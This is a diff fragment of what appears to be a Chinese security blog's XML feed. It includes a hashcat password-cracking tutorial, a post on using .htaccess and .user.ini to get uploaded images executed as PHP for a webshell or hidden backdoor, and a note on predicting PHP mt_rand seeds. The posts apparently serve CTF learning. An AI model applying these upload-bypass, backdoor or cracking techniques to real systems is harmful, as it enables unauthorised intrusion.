+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd hashcat &#x2F;&#x2F;进入目录</span><br><span class="line"></span><br><span class="line">sudo make </span><br><span class="line"></span><br><span class="line">sudo make install &#x2F;&#x2F;安装hashcat</span><br></pre></td></tr></table></figure>
+<h3 id="hashcat常用命令"><a class="header-anchor" href="#hashcat常用命令">¶</a>hashcat常用命令</h3>
+<p>-m              指定哈希类型</p>
+<p>-a               指定破解模式</p>
+<p>-V               查看版本信息</p>
+<p>-o               将输出结果储存到指定文件</p>
+<p>–force           忽略警告</p>
+<p>–show           仅显示破解的hash密码和对应的明文</p>
+<p>–remove         从源文件中删除破解成功的hash</p>
+<p>–username       忽略hash表中的用户名</p>
+<p>-b               测试计算机破解速度和相关硬件信息</p>
+<p>-O               限制密码长度</p>
+<p>-T               设置线程数</p>
+<p>-r               使用规则文件</p>
+<p>-1               自定义字符集 -1 0123asd   ?1={0123asd}</p>
+<p>-2               自定义字符集 -2 0123asd   ?2={0123asd}</p>
+<p>-3               自定义字符集 -3 0123asd   ?3={0123asd}</p>
+<p>-i                启用增量破解模式</p>
+<p>–increment-min    设置密码最小长度</p>
+<p>–increment-max    设置密码最大长度</p>
+<h3 id="hashcat破解模式介绍"><a class="header-anchor" href="#hashcat破解模式介绍">¶</a>hashcat破解模式介绍</h3>
+<p>0   straight                      字典破解</p>
+<p>1   combination                   将字典中密码进行组合（1 2&gt;11 22 12 21）</p>
+<p>3   brute-force                    使用指定掩码破解</p>
+<p>6   Hybrid Wordlist + Mask          字典+掩码破解</p>
+<p>7   Hybrid Mask + Wordlist         掩码+字典破解</p>
+<h3 id="hashcat集成的字符集"><a class="header-anchor" href="#hashcat集成的字符集">¶</a>hashcat集成的字符集</h3>
+<p>?l         代表小写字母</p>
+<p>?u        代表大写字母</p>
+<p>?d        代表数字</p>
+<p>?s        代表特殊字符</p>
+<p>?a        代表大小写字母、数字以及特殊字符</p>
+<p>?b        0x00-0xff</p>
+<h3 id="实例演示-暴力破解MD5值"><a class="header-anchor" href="#实例演示-暴力破解MD5值">¶</a>实例演示-暴力破解MD5值</h3>
+<p><strong>1.使用字典进行破解</strong></p>
+<p>hashcat -a 0 0192023a7bbd73250516f069df18b500 password.txt --force</p>
+<p><strong>2.使用指定字符集进行破解</strong></p>
+<p>hashcat -a 3 63a9f0ea7bb98050796b649e85481845 ?l?l?l?l --force</p>
+<p><strong>3.使用字典+掩码进行破解</strong></p>
+<p>hashcat -a 6 1844156d4166d94387f1a4ad031ca5fa password.txt ?d?d?d --force</p>
+<p><strong>4.使用掩码+字典进行破解</strong></p>
+<p>hashcat -a 7 f8def8bcecb2e7925a2b42d60d202deb  ?d?d password.txt  --force</p>
+<p><strong>如果破解时间太长，我们可以按s键查看破解进度，p键暂停，r键继续破解，q键退出破解。</strong></p>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>hashcat</category>
+      </categories>
+  </entry>
+  <entry>
     <title>ctfshow入门之文件上传</title>
     <url>/2021/01/15/ctfshow%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
     <content><![CDATA[<h2 id="151-152"><a class="header-anchor" href="#151-152">¶</a>151-152</h2>
@@ -635,61 +852,64 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
-    <title>hashcat安装及其使用教程</title>
-    <url>/2021/01/25/hashcat%E5%AE%89%E8%A3%85%E5%8F%8A%E5%85%B6%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<h3 id="hashcat简介"><a class="header-anchor" href="#hashcat简介">¶</a>hashcat简介</h3>
-<p><strong>hashcat是一款自称为世界上最快的密码破解工具。</strong></p>
-<h3 id="hashcatt安装"><a class="header-anchor" href="#hashcatt安装">¶</a>hashcatt安装</h3>
-<p>把github上面的源码down到本地：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;hashcat&#x2F;hashcat.git</span><br></pre></td></tr></table></figure>
-<p>生成项目：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd hashcat &#x2F;&#x2F;进入目录</span><br><span class="line"></span><br><span class="line">sudo make </span><br><span class="line"></span><br><span class="line">sudo make install &#x2F;&#x2F;安装hashcat</span><br></pre></td></tr></table></figure>
-<h3 id="hashcat常用命令"><a class="header-anchor" href="#hashcat常用命令">¶</a>hashcat常用命令</h3>
-<p>-m              指定哈希类型</p>
-<p>-a               指定破解模式</p>
-<p>-V               查看版本信息</p>
-<p>-o               将输出结果储存到指定文件</p>
-<p>–force           忽略警告</p>
-<p>–show           仅显示破解的hash密码和对应的明文</p>
-<p>–remove         从源文件中删除破解成功的hash</p>
-<p>–username       忽略hash表中的用户名</p>
-<p>-b               测试计算机破解速度和相关硬件信息</p>
-<p>-O               限制密码长度</p>
-<p>-T               设置线程数</p>
-<p>-r               使用规则文件</p>
-<p>-1               自定义字符集 -1 0123asd   ?1={0123asd}</p>
-<p>-2               自定义字符集 -2 0123asd   ?2={0123asd}</p>
-<p>-3               自定义字符集 -3 0123asd   ?3={0123asd}</p>
-<p>-i                启用增量破解模式</p>
-<p>–increment-min    设置密码最小长度</p>
-<p>–increment-max    设置密码最大长度</p>
-<h3 id="hashcat破解模式介绍"><a class="header-anchor" href="#hashcat破解模式介绍">¶</a>hashcat破解模式介绍</h3>
-<p>0   straight                      字典破解</p>
-<p>1   combination                   将字典中密码进行组合（1 2&gt;11 22 12 21）</p>
-<p>3   brute-force                    使用指定掩码破解</p>
-<p>6   Hybrid Wordlist + Mask          字典+掩码破解</p>
-<p>7   Hybrid Mask + Wordlist         掩码+字典破解</p>
-<h3 id="hashcat集成的字符集"><a class="header-anchor" href="#hashcat集成的字符集">¶</a>hashcat集成的字符集</h3>
-<p>?l         代表小写字母</p>
-<p>?u        代表大写字母</p>
-<p>?d        代表数字</p>
-<p>?s        代表特殊字符</p>
-<p>?a        代表大小写字母、数字以及特殊字符</p>
-<p>?b        0x00-0xff</p>
-<h3 id="实例演示-暴力破解MD5值"><a class="header-anchor" href="#实例演示-暴力破解MD5值">¶</a>实例演示-暴力破解MD5值</h3>
-<p><strong>1.使用字典进行破解</strong></p>
-<p>hashcat -a 0 0192023a7bbd73250516f069df18b500 password.txt --force</p>
-<p><strong>2.使用指定字符集进行破解</strong></p>
-<p>hashcat -a 3 63a9f0ea7bb98050796b649e85481845 ?l?l?l?l --force</p>
-<p><strong>3.使用字典+掩码进行破解</strong></p>
-<p>hashcat -a 6 1844156d4166d94387f1a4ad031ca5fa password.txt ?d?d?d --force</p>
-<p><strong>4.使用掩码+字典进行破解</strong></p>
-<p>hashcat -a 7 f8def8bcecb2e7925a2b42d60d202deb  ?d?d password.txt  --force</p>
-<p><strong>如果破解时间太长，我们可以按s键查看破解进度，p键暂停，r键继续破解，q键退出破解。</strong></p>
+    <title>.htaccess和.user.ini文件的妙用</title>
+    <url>/2021/01/16/htaccess%E5%92%8C-user-ini%E6%96%87%E4%BB%B6%E7%9A%84%E5%A6%99%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="htaccess"><a class="header-anchor" href="#htaccess">¶</a>.htaccess</h2>
+<p>httpd-conf是Apache的系统配置文件，一个全局的配置文件，对整个web服务起作用；而.htaccess也是Apache的配置文件，不过相当于一个局部配置文件，只对该文件所在目录下的文件起作用。</p>
+<h3 id="实例"><a class="header-anchor" href="#实例">¶</a>实例</h3>
+<p>在绕过文件上传的限制中，通常在Apache全局配置文件httpd.conf中有这样一条配置：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .php .phtml</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2021011615060595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>这条配置的意思就是将.php、.phtml文件后缀的文件当做php文件执行，如果开启了这条配置，就可以上传.phtml文件在执行php代码，这也就是为什么在文件上传时可以尝试上传.phtml，不过在高版本中这条配置默认是关闭的，也就是只能解析.php文件后缀。</p>
+<p>或者这条配置：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>
+<p>将所有文件都解析为php文件。</p>
+<p>通常全局文件我们都是不可更改的，而Apache还有一个局部配置文件.htaccess，这个配置文件只对该目录所在的web目录起作用，例如：我们在www目录下有一个.htaccess配置文件，配置内容为 <code>AddType application/x-httpd-php .jpg</code> ，将jpg文件当做PHP文件解析。这样就可以直接解析jpg后缀的webshell。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; .htaccess</span><br><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 1.jpg</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p>访问1.jpg，当做PHP解析。</p>
+<h3 id="局限"><a class="header-anchor" href="#局限">¶</a>局限</h3>
+<p>.htaccess配置文件只在Apache服务器中起作用。</p>
+<h2 id="user-ini"><a class="header-anchor" href="#user-ini">¶</a>.user.ini</h2>
+<p>那么什么是.user.ini？</p>
+<p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a href="http://php.net/manual/zh/ini.list.php">php.net/manual/zh/i…</a> 这几种模式有什么区别？看看官方的解释：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210116151405369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a href="http://php.net/manual/zh/configuration.file.per-user.php">这里</a>又解释了：</p>
+<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER['DOCUMENT_ROOT']</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
+<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
+<p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
+<p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p>
+<p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
+<p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p>
+<p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210116151430962.png" alt="在这里插入图片描述"></p>
+<p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210116151450360.png" alt="在这里插入图片描述"></p>
+<p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;1.png</span><br></pre></td></tr></table></figure>
+<p>总结:</p>
+<p><strong>在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</strong></p>
+<h3 id="实例-v2"><a class="header-anchor" href="#实例-v2">¶</a>实例</h3>
+<p>利用php上文配置项中有两个配置可以起到一些作用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file &#x3D; &lt;filename&gt;         &#x2F;&#x2F;包含在文件头</span><br><span class="line">auto_append_file &#x3D; &lt;filename&gt;          &#x2F;&#x2F;包含在文件尾</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210116150859202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210116150752148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>这两个配置项的作用相当于一个文件包含，比如</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; .user.ini</span><br><span class="line">auto_prepend_file &#x3D; 1.jpg</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 1.jpg</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 11.php</span><br></pre></td></tr></table></figure>
+<p>也就是在一个目录下有.user.ini这个配置文件，配置内容为上，有1.jpg，同时该目录下还需要有.php后缀的文件，<code>auto_prepend_file = 1.jpg</code> 这个配置的意思就是在当前目录下的.php文件包含1.jpg这个图片，在此处相当于在11.php文件头插入了 <code>require('1.jpg')</code> 这条语句，也就是说相当于文件包含。<br>
+另一条配置包含在文件尾，如果遇到了exit语句的话就会失效。</p>
+<p>.user.ini使用范围很广，不仅限于Apache服务器，同样适用于Nginx服务器，只要服务器启用了fastcgi模式(通常非线程安全模式使用的就是fastcgi模式)。</p>
+<h3 id="局限-v2"><a class="header-anchor" href="#局限-v2">¶</a>局限</h3>
+<p>在.user.ini中使用这条配置的使用也说了是在同目录下的其他.php文件中包含配置中所指定的文件，也就是说需要该目录下存在.php文件，通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。</p>
+<p>但是有时可以使用 <code>../</code> 来将文件上传到其他目录，达到一个利用的效果。</p>
+<p>参考:</p>
+<p><a href="https://www.cnblogs.com/hmbb/p/9689436.html">https://www.cnblogs.com/hmbb/p/9689436.html</a></p>
+<p><a href="https://juejin.cn/post/6844903571876478989">https://juejin.cn/post/6844903571876478989</a></p>
+<p><a href="https://www.dazhuanlan.com/2020/03/08/5e641cbc397c2/?__cf_chl_jschl_tk__=2cc2c77a0da33ccfc56eb3d9d0ea524d3c052fa3-1610779227-0-AbdcQTwDwFTtyRxD4ZY9TMgaOri_RcrcEmmOfmDlKaPz3yZF6prJ5XcRuaawDlwh7Faf_dlnJpvgZ6R3T_SEJYvKp1E6FQQaQlDWVyqBnlTEhsMuhW7qujE2Y-tueBJGFNmXRCMSBcnJipEevNYliZqR3UySscVfQ4pS68uI7Uo99pdsTpn7pZfCuoAQuYKiEw9ZNCDRO3X_NrYJof0l60g617IUgy_8024ZMHG3OutwuXQ3K2LPBvQNIHNAGWCh1NnJXwqfHamlTKilXoZuEakmlcPZDqhk_SrZuw78HW3UCOOLrexW9pSh0PEIRUIaUOFH5DlkEY2IMCNlIJjrpaU">user.ini</a></p>
+<p>​</p>
 ]]></content>
       <categories>
-        <category>工具</category>
-        <category>hashcat</category>
+        <category>web技术学习</category>
+        <category>文件上传</category>
       </categories>
   </entry>
   <entry>
@@ -753,108 +973,6 @@ payload: cat flag.php||</p>
       <categories>
         <category>web技术学习</category>
         <category>常见黑魔法</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>.htaccess和.user.ini文件的妙用</title>
-    <url>/2021/01/16/htaccess%E5%92%8C-user-ini%E6%96%87%E4%BB%B6%E7%9A%84%E5%A6%99%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="htaccess"><a class="header-anchor" href="#htaccess">¶</a>.htaccess</h2>
-<p>httpd-conf是Apache的系统配置文件，一个全局的配置文件，对整个web服务起作用；而.htaccess也是Apache的配置文件，不过相当于一个局部配置文件，只对该文件所在目录下的文件起作用。</p>
-<h3 id="实例"><a class="header-anchor" href="#实例">¶</a>实例</h3>
-<p>在绕过文件上传的限制中，通常在Apache全局配置文件httpd.conf中有这样一条配置：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .php .phtml</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2021011615060595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>这条配置的意思就是将.php、.phtml文件后缀的文件当做php文件执行，如果开启了这条配置，就可以上传.phtml文件在执行php代码，这也就是为什么在文件上传时可以尝试上传.phtml，不过在高版本中这条配置默认是关闭的，也就是只能解析.php文件后缀。</p>
-<p>或者这条配置：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>
-<p>将所有文件都解析为php文件。</p>
-<p>通常全局文件我们都是不可更改的，而Apache还有一个局部配置文件.htaccess，这个配置文件只对该目录所在的web目录起作用，例如：我们在www目录下有一个.htaccess配置文件，配置内容为 <code>AddType application/x-httpd-php .jpg</code> ，将jpg文件当做PHP文件解析。这样就可以直接解析jpg后缀的webshell。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; .htaccess</span><br><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 1.jpg</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
-<p>访问1.jpg，当做PHP解析。</p>
-<h3 id="局限"><a class="header-anchor" href="#局限">¶</a>局限</h3>
-<p>.htaccess配置文件只在Apache服务器中起作用。</p>
-<h2 id="user-ini"><a class="header-anchor" href="#user-ini">¶</a>.user.ini</h2>
-<p>那么什么是.user.ini？</p>
-<p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a href="http://php.net/manual/zh/ini.list.php">php.net/manual/zh/i…</a> 这几种模式有什么区别？看看官方的解释：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210116151405369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a href="http://php.net/manual/zh/configuration.file.per-user.php">这里</a>又解释了：</p>
-<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER['DOCUMENT_ROOT']</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
-<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
-<p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
-<p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p>
-<p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
-<p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p>
-<p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210116151430962.png" alt="在这里插入图片描述"></p>
-<p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210116151450360.png" alt="在这里插入图片描述"></p>
-<p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;1.png</span><br></pre></td></tr></table></figure>
-<p>总结:</p>
-<p><strong>在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</strong></p>
-<h3 id="实例-v2"><a class="header-anchor" href="#实例-v2">¶</a>实例</h3>
-<p>利用php上文配置项中有两个配置可以起到一些作用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file &#x3D; &lt;filename&gt;         &#x2F;&#x2F;包含在文件头</span><br><span class="line">auto_append_file &#x3D; &lt;filename&gt;          &#x2F;&#x2F;包含在文件尾</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210116150859202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210116150752148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>这两个配置项的作用相当于一个文件包含，比如</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; .user.ini</span><br><span class="line">auto_prepend_file &#x3D; 1.jpg</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 1.jpg</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 11.php</span><br></pre></td></tr></table></figure>
-<p>也就是在一个目录下有.user.ini这个配置文件，配置内容为上，有1.jpg，同时该目录下还需要有.php后缀的文件，<code>auto_prepend_file = 1.jpg</code> 这个配置的意思就是在当前目录下的.php文件包含1.jpg这个图片，在此处相当于在11.php文件头插入了 <code>require('1.jpg')</code> 这条语句，也就是说相当于文件包含。<br>
-另一条配置包含在文件尾，如果遇到了exit语句的话就会失效。</p>
-<p>.user.ini使用范围很广，不仅限于Apache服务器，同样适用于Nginx服务器，只要服务器启用了fastcgi模式(通常非线程安全模式使用的就是fastcgi模式)。</p>
-<h3 id="局限-v2"><a class="header-anchor" href="#局限-v2">¶</a>局限</h3>
-<p>在.user.ini中使用这条配置的使用也说了是在同目录下的其他.php文件中包含配置中所指定的文件，也就是说需要该目录下存在.php文件，通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。</p>
-<p>但是有时可以使用 <code>../</code> 来将文件上传到其他目录，达到一个利用的效果。</p>
-<p>参考:</p>
-<p><a href="https://www.cnblogs.com/hmbb/p/9689436.html">https://www.cnblogs.com/hmbb/p/9689436.html</a></p>
-<p><a href="https://juejin.cn/post/6844903571876478989">https://juejin.cn/post/6844903571876478989</a></p>
-<p><a href="https://www.dazhuanlan.com/2020/03/08/5e641cbc397c2/?__cf_chl_jschl_tk__=2cc2c77a0da33ccfc56eb3d9d0ea524d3c052fa3-1610779227-0-AbdcQTwDwFTtyRxD4ZY9TMgaOri_RcrcEmmOfmDlKaPz3yZF6prJ5XcRuaawDlwh7Faf_dlnJpvgZ6R3T_SEJYvKp1E6FQQaQlDWVyqBnlTEhsMuhW7qujE2Y-tueBJGFNmXRCMSBcnJipEevNYliZqR3UySscVfQ4pS68uI7Uo99pdsTpn7pZfCuoAQuYKiEw9ZNCDRO3X_NrYJof0l60g617IUgy_8024ZMHG3OutwuXQ3K2LPBvQNIHNAGWCh1NnJXwqfHamlTKilXoZuEakmlcPZDqhk_SrZuw78HW3UCOOLrexW9pSh0PEIRUIaUOFH5DlkEY2IMCNlIJjrpaU">user.ini</a></p>
-<p>​</p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>文件上传</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>php伪随机数漏洞</title>
-    <url>/2020/10/10/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
-    <content><![CDATA[<p>针对ctf中伪随机数漏洞利用的小结</p>
-<a id="more"></a>
-<h2 id="相关函数"><a class="header-anchor" href="#相关函数">¶</a>相关函数</h2>
-<h3 id="mt-rand"><a class="header-anchor" href="#mt-rand">¶</a>mt_rand()</h3>
-<p>mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p>
-<h3 id="mt-srand"><a class="header-anchor" href="#mt-srand">¶</a>mt_srand()</h3>
-<p>用于播下一个更好的随机数发生器种子，用 <code>seed</code> 来给随机数发生器播种。 没有设定 <code>seed</code> 参数时，会被设为随时数。自 PHP 4.2.0 起，不再需要用 <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> 或 <strong>mt_srand()</strong> 给随机数发生器播种 ，因为现在是由系统自动完成的。</p>
-<p><strong>简单来说mt_scrand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数</strong></p>
-<p>这张图能帮助我们更好的了解php伪随机数</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/0bea9d50a588a31bb6a9e033987d6034.png" alt="img"></p>
-<h2 id="代码测试"><a class="header-anchor" href="#代码测试">¶</a>代码测试</h2>
-<p>我们输入种子12345 ，发现不管什么时候，回显的随机数都是一样的。其实，这就是伪随机数的漏洞，存在可预测性。</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155039595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155049424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>总的来说，我们知道种子后，可以确定你输出伪随机数的序列。 知道你的随机数序列，可以确定你的种子。</strong></p>
-<h2 id="根据随机数预测种子"><a class="header-anchor" href="#根据随机数预测种子">¶</a>根据随机数预测种子</h2>
-<p>以上面生成的随机数为例，假设我们知道了第一个生成的随机数，那我们怎么预测种子呢？<br>
-那就要用到<strong>php_mt_seed</strong>这个工具了。</p>
-<h3 id="php-mt-seed使用方法"><a class="header-anchor" href="#php-mt-seed使用方法">¶</a>php_mt_seed使用方法</h3>
-<p>kali下，进入目录，make</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155151119.png#pic_center" alt="在这里插入图片描述"></p>
-<p>./php_mt_seed 第一个随机数 ，（假设我们知道序列的第一个随机数是 1507887240）</p>
-<p>可以得到种子</p>
-<p><img src="https://img-blog.csdnimg.cn/20201013155210758.png#pic_center" alt="在这里插入图片描述"></p>
-<p>验证种子是否一样就是看 输出的序列是否一样</p>
